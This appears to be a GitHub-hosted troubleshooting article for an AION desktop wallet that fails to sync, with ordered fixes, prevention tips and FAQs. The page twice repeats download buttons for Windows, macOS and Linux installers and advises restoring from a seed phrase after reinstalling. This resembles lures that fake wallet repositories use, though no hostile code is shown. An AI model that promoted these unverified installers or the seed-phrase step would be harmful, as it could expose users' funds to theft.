![Aion Wallet](assets/banner-article.png)

# Aion wallet not syncing: what to check

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

A wallet that will not sync is almost always failing to reach a node that has caught up with the chain, and your keys and coins are unaffected while it does.

That distinction is the first thing to establish, because a stalled connection looks alarming and is one of the least dangerous faults in the application. The balance still exists at your address on the network; the window you are looking through has simply stopped updating.

## You'll see this if

- The status line stays on connecting, or on a block height that does not move.
- The balance shows as zero or as a dash, while the address is one you have used before.
- A transaction you sent does not appear, even though it was confirmed elsewhere.
- The application opens normally but every screen that needs network data stays empty.

If the wallet opens with a different error, such as a rejected password, this is the wrong article; start with the [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide instead.

## Why it happens

The desktop client is not a node. It talks to one, over the network, and everything it displays is fetched from that endpoint. When the endpoint is slow, unreachable or behind the chain, the interface has nothing current to show.

Four causes account for most reports. The installed build is older than the current release and points at an endpoint that has since changed. A local network condition blocks the connection: a firewall rule, a VPN, a proxy, or a DNS resolver that returns the wrong address. The public endpoint itself is unavailable, which affects everyone at once and shows up as an error page rather than a slow wallet. Or the local data directory is in a bad state after an interrupted shutdown.

Observed availability is worth separating from a permanent claim. Public Aion endpoints have returned gateway errors during checks, and a run of failures across an hour is a different signal from a single stuck screen on one machine.

## The fix, in order

1. Update to the current release from the release page, then open the wallet again. Most connection faults are already fixed in the current build, and this step resolves the largest share of reports.
2. Confirm the machine can reach the network at all: open any website, then check whether a VPN or proxy is active. If one is, disconnect it and restart the application.
3. Restart the wallet completely, not just the window. Quit it from the system tray or the task manager so the connection is rebuilt from scratch.
4. Check the public side. If the network's explorer or dashboard is also failing, the problem is upstream and no local change will fix it; wait and retry.
5. Allow the application through the firewall for both private and public networks if you are on Windows, or confirm no outbound rule blocks it on macOS and Linux.
6. If the status still never advances, reinstall the current release and restore from your seed phrase or keystore file, which rebuilds the local data without touching the coins.

Do not delete a wallet directory as a first step. Uninstalling before you have a working backup of the seed phrase or keystore file turns a connection problem into a permanent loss.

## If that did not work

Open your address in a block explorer. If the balance and the transaction history are there, the chain state is fine and the fault is entirely local: the endpoint, the network path, or the installation.

If the explorer shows the same empty balance you see in the wallet, the question changes from syncing to account identity, and the [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) article covers the cases where the wrong account or the wrong network is being read.

If the explorer cannot be reached either, treat it as an availability question. The [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) guide explains what still works while a public service is unavailable, including how to confirm a transaction without one.

## Prevention

Keep the application on the current release rather than on whichever build was installed first. Connection behaviour, endpoints and error handling change between versions, and an old build will keep failing in a way that looks like a network outage on your side.

Keep one clean backup of the seed phrase on paper and one keystore export in a separate offline location, so a reinstall is a five-minute operation rather than a decision about whether you can afford to lose the installation.

And check the hash of any new installer against the value published with it before you run it, as described in the [Aion wallet download verify](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-download-verify.md) guide. A build from anywhere else is a much larger risk than a slow endpoint.

## Frequently asked questions

### Are my coins lost while the wallet is not syncing?

No. The balance is a property of the address on the chain, not of the application. A stalled connection changes what you can see, not what you own.

### How long should a first sync take?

It depends on the endpoint rather than on your machine, because the client reads state from a node instead of rebuilding the chain locally. A connection that has not advanced in ten minutes is stuck, not slow.

### Does reinstalling delete my wallet?

It removes the local application data, which is why the seed phrase or a keystore export has to exist first. With either one, the wallet is restored on the new installation.

### Can I use the wallet while the network is down?

You can open it and read what was last loaded. Sending is not possible, because a transaction has to be broadcast to a node.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) - when an empty balance is an account problem rather than a connection.
- [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) - what still works when a public service fails.
- [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) - missing history and what it usually means.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - getting back in with a seed phrase, keystore or device.
